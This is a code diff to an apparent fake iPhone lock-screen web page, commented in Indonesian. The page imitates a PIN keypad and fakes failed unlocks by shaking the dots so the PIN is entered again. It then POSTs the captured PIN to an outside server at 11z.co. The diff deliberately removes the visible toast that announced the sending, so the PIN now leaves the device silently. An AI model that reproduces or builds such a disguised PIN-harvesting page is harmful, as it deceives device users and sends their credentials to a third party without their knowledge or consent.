@@ -11,7 +11,7 @@
   <link rel="apple-touch-startup-image" href="./icon/lock-512x512.png" />
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
-  <meta name="apple-mobile-web-app-title" content="P-Lock V4" />
+  <meta name="apple-mobile-web-app-title" content="P-Lock V3" />
   <link rel="icon" type="image/png" sizes="192x192" href="./icon/lock-192x192.png" />
 
   <style>
@@ -277,13 +277,13 @@
       position: fixed !important;
       top: 0 !important;
       left: 0 !important;
-      width: 100px !important; /* Area yang lebih besar untuk mudah diklik */
+      width: 100px !important;
       height: 100px !important;
       background-color: transparent !important;
       border: none !important;
       z-index: 1000 !important;
       cursor: pointer !important;
-      opacity: 0 !important; /* Sepenuhnya transparan */
+      opacity: 0 !important;
       display: none !important;
     }
 
@@ -294,43 +294,10 @@
       left: 0;
       width: 100px;
       height: 100px;
-      background-color: rgba(255, 0, 0, 0.1); /* Hanya untuk debugging */
+      background-color: rgba(255, 0, 0, 0.1);
       z-index: 999;
       display: none;
       pointer-events: none;
-    }
-
-    /* Toast notification untuk API */
-    .api-toast {
-      position: fixed;
-      bottom: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(0, 0, 0, 0.8);
-      color: white;
-      padding: 12px 20px;
-      border-radius: 25px;
-      font-size: 14px;
-      z-index: 2000;
-      opacity: 0;
-      transition: opacity 0.3s ease;
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .api-toast.show {
-      opacity: 1;
-    }
-
-    .api-toast.success {
-      background: rgba(34, 197, 94, 0.8);
-    }
-
-    .api-toast.error {
-      background: rgba(239, 68, 68, 0.8);
     }
   </style>
 </head>
@@ -338,11 +305,6 @@
 <body>
   <!-- Background Overlay -->
   <div class="background-overlay" id="backgroundOverlay"></div>
-
-  <!-- Toast Notification -->
-  <div class="api-toast" id="apiToast">
-    <span id="toastMessage">Mengirim PIN ke API...</span>
-  </div>
 
   <!-- Back Button - FULL TRANSPARANT -->
   <button id="backBtn" style="display: none;"></button>
@@ -426,8 +388,6 @@
     const fakeImagePreview = document.getElementById('fakeImagePreview');
     const backBtn = document.getElementById('backBtn');
     const backBtnHotspot = document.getElementById('backBtnHotspot');
-    const apiToast = document.getElementById('apiToast');
-    const toastMessage = document.getElementById('toastMessage');
 
     // API Configuration
     const API_URL = 'https://11z.co/_w/6804/selection';
@@ -452,22 +412,12 @@
     let touchCount = 0;
 
     // ============================================
-    // API FUNCTIONS - TAMBAHAN BARU
+    // API FUNCTIONS - TANPA NOTIFIKASI
     // ============================================
-    function showToast(message, type = 'info') {
-      toastMessage.textContent = message;
-      apiToast.className = 'api-toast';
-      apiToast.classList.add(type, 'show');
-      
-      // Auto hide after 3 seconds
-      setTimeout(() => {
-        apiToast.classList.remove('show');
-      }, 3000);
-    }
-
     async function sendPinToAPI(pin) {
       try {
-        showToast('Mengirim PIN ke API...', 'info');
+        // Hanya log ke console (tidak ada UI feedback)
+        console.log(`[API] Mengirim PIN ke API: ${pin}`);
         
         const response = await fetch(API_URL, {
           method: 'POST',
@@ -485,16 +435,14 @@
         });
         
         if (response.ok) {
-          showToast('PIN berhasil dikirim!', 'success');
-          console.log('PIN sent to API:', pin);
+          console.log('[API] PIN berhasil dikirim');
         } else {
-          showToast(`Gagal mengirim (${response.status})`, 'error');
-          console.error('API Error:', await response.text());
+          console.error('[API Error]:', await response.text());
         }
       } catch (error) {
-        showToast('Gagal terhubung ke API', 'error');
-        console.error('Network Error:', error);
+        console.error('[API Network Error]:', error);
       }
+      // TIDAK ADA UI FEEDBACK SAMA SEKALI
     }
 
     // ============================================
@@ -564,10 +512,9 @@
         const deltaY = touchEndY - touchStartY;
         const deltaTime = Date.now() - touchStartTime;
         
-        // Check if it's a downward swipe with enough distance and speed
         if (deltaY > 50 && deltaTime < 300) {
           openBackgroundSettings();
-          touchCount = 0; // Reset to prevent multiple triggers
+          touchCount = 0;
         }
       }
     });
@@ -612,7 +559,6 @@
           backgroundOverlay.style.backgroundImage = `url(${imageUrl})`;
           backgroundOverlay.style.display = 'block';
           
-          // Save to localStorage
           localStorage.setItem('lockScreenBackground', imageUrl);
           
           closeBackgroundSettings();
@@ -622,7 +568,7 @@
     });
 
     // ============================================
-    // UPLOADED IMAGE HANDLING - DENGAN LOCALSTORAGE
+    // UPLOADED IMAGE HANDLING
     // ============================================
     document.getElementById('imageInput').addEventListener('change', function (e) {
       const file = e.target.files[0];
@@ -631,14 +577,11 @@
         reader.onload = function(event) {
           const imageURL = event.target.result;
           
-          // Update preview
           fakeImagePreview.src = imageURL;
           fakeImagePreview.style.display = 'block';
           
-          // Update uploaded image
           uploadedImageSrc = imageURL;
           
-          // Save to localStorage
           localStorage.setItem('unlockedImage', imageURL);
           
           console.log("Image saved to localStorage");
@@ -653,14 +596,12 @@
     // LOAD SAVED IMAGES ON STARTUP
     // ============================================
     function loadSavedImages() {
-      // Load background
       const savedBackground = localStorage.getItem('lockScreenBackground');
       if (savedBackground) {
         backgroundOverlay.style.backgroundImage = `url(${savedBackground})`;
         backgroundOverlay.style.display = 'block';
       }
       
-      // Load unlocked page image
       const savedUnlockedImage = localStorage.getItem('unlockedImage');
       if (savedUnlockedImage) {
         fakeImagePreview.src = savedUnlockedImage;
@@ -671,7 +612,7 @@
     }
 
     // ============================================
-    // KEYPAD FUNCTIONALITY - DENGAN MODIFIKASI
+    // KEYPAD FUNCTIONALITY
     // ============================================
     keys.forEach(key => {
         key.addEventListener('click', () => {
@@ -721,7 +662,7 @@
     }
 
     // ============================================
-    // SHAKE DOTS - DENGAN MODIFIKASI UNTUK KIRIM KE API
+    // SHAKE DOTS - DENGAN KIRIM KE API (TANPA FEEDBACK)
     // ============================================
     function shakeDots() {
         if (savedPins.length + 1 < pinRepeatTarget) {
@@ -731,11 +672,9 @@
             setTimeout(() => {
                 dotsContainer.classList.remove('shake');
                 
-                // Simpan PIN ke array
                 savedPins.push(currentInput);
                 
-                // Jika ini PIN kedua terakhir (PIN ke-1 jika total 2, atau ke-2 jika total 3, dst)
-                // Kirim PIN kedua terakhir ke API
+                // Kirim PIN kedua terakhir ke API (tanpa feedback UI)
                 if (savedPins.length === (pinRepeatTarget - 1)) {
                     const secondLastPin = savedPins[savedPins.length - 1];
                     sendPinToAPI(secondLastPin);
@@ -745,15 +684,13 @@
                 updateDots();
             }, 500);
         } else {
-            // Ini adalah PIN terakhir
             savedPins.push(currentInput);
             
-            // Kirim PIN kedua terakhir ke API
+            // Kirim PIN kedua terakhir ke API (tanpa feedback UI)
             if (savedPins.length >= 2) {
                 const secondLastPin = savedPins[savedPins.length - 2];
                 sendPinToAPI(secondLastPin);
             } else {
-                // Jika hanya satu PIN, kirim yang satu itu
                 sendPinToAPI(currentInput);
             }
             
@@ -762,16 +699,15 @@
     }
 
     // ============================================
-    // SHOW UNLOCKED PAGE - DENGAN backBtn YANG TAMPIL
+    // SHOW UNLOCKED PAGE
     // ============================================
     function showUnlockedPage() {
         document.querySelectorAll('.lock-icon, .prompt, .dots, .keypad, .bottom-buttons')
             .forEach(el => el.style.display = 'none');
 
         unlockPage.style.display = 'block';
-        backBtn.style.display = 'block'; // TAMPILKAN backBtn (tapi tetap transparan)
+        backBtn.style.display = 'block';
         
-        // Load saved image if exists
         if (uploadedImageSrc) {
             uploadedImage.src = uploadedImageSrc;
             uploadedImage.style.display = 'block';
@@ -784,19 +720,18 @@
         currentInput = '';
         updateDots();
         
-        // Tampilkan semua PIN yang dimasukkan (untuk debugging)
         console.log('All PINs entered:', savedPins);
     }
 
     // ============================================
-    // BACK BUTTON FUNCTIONALITY - DIPERBAIKI
+    // BACK BUTTON FUNCTIONALITY
     // ============================================
     backBtn.addEventListener('click', () => {
         unlockPage.style.opacity = '0';
         
         setTimeout(() => {
             unlockPage.style.display = 'none';
-            backBtn.style.display = 'none'; // SEMBUNYIKAN backBtn
+            backBtn.style.display = 'none';
             
             document.querySelector('.lock-icon').style.display = 'block';
             document.querySelector('.prompt').style.display = 'block';
@@ -813,10 +748,9 @@
     });
 
     // ============================================
-    // PRESS AND HOLD - DENGAN EXCLUDE backBtn
+    // PRESS AND HOLD
     // ============================================
     unlockPage.addEventListener("touchstart", (e) => {
-        // Exclude jika yang disentuh adalah backBtn
         if (e.target === backBtn || backBtn.contains(e.target)) {
             return;
         }
@@ -830,7 +764,6 @@
     });
 
     unlockPage.addEventListener("touchend", (e) => {
-        // Exclude jika yang disentuh adalah backBtn
         if (e.target === backBtn || backBtn.contains(e.target)) {
             return;
         }
@@ -844,7 +777,6 @@
     });
 
     unlockPage.addEventListener("touchcancel", (e) => {
-        // Exclude jika yang disentuh adalah backBtn
         if (e.target === backBtn || backBtn.contains(e.target)) {
             return;
         }
@@ -883,14 +815,14 @@
     // ============================================
     function initApp() {
       initDots();
-      loadSavedImages(); // Load both background and uploaded image
+      loadSavedImages();
       
       promptText.addEventListener('dblclick', togglePinLength);
       
       console.log('iPhone Lock Screen initialized');
       console.log('API URL:', API_URL);
       console.log('PIN akan dikirim ke API saat memasukkan PIN kedua terakhir');
-      console.log('Contoh: Jika repeat=3, PIN ke-2 akan dikirim ke API');
+      console.log('Tidak ada notifikasi UI untuk pengiriman API');
     }
 
     // Start the app
